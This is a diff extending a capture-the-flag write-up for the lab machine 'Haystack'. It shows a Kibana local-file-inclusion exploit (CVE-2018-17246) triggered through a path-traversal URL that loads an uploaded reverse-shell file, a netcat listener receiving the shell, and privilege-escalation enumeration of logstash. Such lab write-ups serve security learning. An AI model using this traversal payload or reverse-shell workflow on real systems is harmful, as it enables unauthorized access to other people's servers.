@@ -150,3 +150,43 @@ Now if we navigate to <b>127.0.0.1:5601</b> on our local machine then you should
 
 <center><img src="/htb/haystack/kibana.png"></center>
 <br>
+
+Next I googled for any exploits relating to Kibana and found *[this](https://github.com/mpgn/CVE-2018-17246)*. It tells us that there is an LFI vulnerability. First I copy my reverse shell over to the box using <b>scp</b> once again. Then I set up my <b>netcat</b> listener and lastly triggered the LFI.
+```
+http://localhost:5601/api/console/api_server?apis=../../../../../../.../../../../tmp/myshell.js
+```
+If I look at my <b>netcat</b> listener it shows a connecton and if I type <b>whoami</b> it shows that I am not the user <b>kibana</b>
+```
+# nc -lvnp 10000
+listening on [any] 10000 ...
+connect to [10.10.14.21] from (UNKNOWN) [10.10.10.115] 58044
+
+whoami
+kibana
+```
+Now for root. I decided to run <b>LinEnum.sh</b> to do some enumeration since we are now a different user. Looking at the running processes you should see this very long process running.
+```
+root       6349  0.5 13.5 2717068 523432 ?      SNsl sep21   6:39 /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFract
+ion=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOut
+OfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-co
+re/lib/jars/commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annota
+tions-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr
+/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars
+/jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.5.jar
+:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash
+-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:
+/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/share/logstash/logstash-cor
+e/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.cor
+e.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.c
+ore.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.re
+sources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1
+.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-
+3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.j
+ar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/l
+ogstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash
+```
+No need to read all of it, the important part is the <b>logstash</b>. We can see from the process that there are two logstash folders. One in <b>/etc/logstash</b> and the other in <b>/usr/share/logstash</b>. If you look in the <b>/etc/logstash</b> directory you will find a <b>conf.d</b> folder with some configuration files.
+```
+bash-4.2$ ls conf.d/
+filter.conf  input.conf  output.conf
+```
